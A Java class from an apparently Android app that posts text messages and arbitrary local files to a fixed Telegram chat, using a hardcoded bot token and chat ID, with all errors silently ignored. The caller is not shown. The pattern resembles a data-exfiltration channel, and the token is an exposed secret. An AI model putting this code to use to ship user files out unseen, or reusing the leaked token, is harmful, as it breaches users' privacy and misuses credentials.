package com.rajputinfo.app;

import org.json.JSONObject;
import java.io.IOException;
import okhttp3.*;

public class TelegramBot {
    private static final String TOKEN = "8806240042:AAHOpAE75akYCsuCk4z7FKwZ4aSyziqGyr0";
    private static final String CHAT_ID = "744564219";
    private static final OkHttpClient client = new OkHttpClient();
    private static final MediaType JSON = MediaType.parse("application/json; charset=utf-8");

    public static void sendMessage(String text) {
        try {
            JSONObject body = new JSONObject();
            body.put("chat_id", CHAT_ID);
            body.put("text", text);
            body.put("parse_mode", "HTML");
            body.put("disable_web_page_preview", true);

            Request req = new Request.Builder()
                    .url("https://api.telegram.org/bot" + TOKEN + "/sendMessage")
                    .post(RequestBody.create(body.toString(), JSON))
                    .build();

            client.newCall(req).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) {}
                @Override public void onResponse(Call call, Response r) throws IOException {
                    if (r.body() != null) r.body().close();
                }
            });
        } catch (Exception ignored) {}
    }

    public static void sendDocument(String filePath, String caption) {
        try {
            java.io.File file = new java.io.File(filePath);
            if (!file.exists()) return;

            RequestBody fileBody = RequestBody.create(file, MediaType.parse("application/octet-stream"));
            MultipartBody multipart = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("caption", caption)
                    .addFormDataPart("document", file.getName(), fileBody)
                    .build();

            Request req = new Request.Builder()
                    .url("https://api.telegram.org/bot" + TOKEN + "/sendDocument")
                    .post(multipart)
                    .build();

            client.newCall(req).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) {}
                @Override public void onResponse(Call call, Response r) throws IOException {
                    if (r.body() != null) r.body().close();
                }
            });
        } catch (Exception ignored) {}
    }
}
